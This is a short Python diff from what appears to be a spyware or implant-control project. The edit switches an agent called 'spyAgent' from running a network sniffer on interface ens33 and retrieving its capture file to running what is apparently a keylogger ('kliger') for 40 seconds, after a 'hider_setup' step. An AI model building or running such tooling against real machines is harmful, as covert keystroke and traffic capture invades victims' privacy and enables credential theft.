@@ -65,16 +65,18 @@ def main():
     spyAgent: Agent = op.spyAgent
 
     print(spyAgent.hider_setup(targetHiderPath, image_path, mount_path))
-    # kligPar = Params()
-    # kligPar.kligP = kligPrams(40)
-    # kligP = ContParams(KligerType, kligPar)
-    # print(spyAgent.runContraption(kligP, 10))
-    # sleep(20)
-    # print(spyAgent.haltContraption(10))
-    sniffP = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
-    print(spyAgent.runContraption(sniffP, 10))
-    sleep(30)
-    print(spyAgent.retrieve_file("0.sniff"))
+    kligPar = Params()
+    kligPar.kligP = kligPrams(40)
+    kligP = ContParams(KligerType, kligPar)
+    print("--------Running kigger----------")
+    print(spyAgent.runContraption(kligP, 10))
+    sleep(40)
+    print(spyAgent.haltContraption(10))
+    print("--------Stopping kigger----------")
+    # sniffP = ContParams(SnifferType, Params(SniffParams(20, b"ens33")))
+    # print(spyAgent.runContraption(sniffP, 10))
+    # sleep(30)
+    # print(spyAgent.retrieve_file("0.sniff"))
 
 
 def main_with_ui():
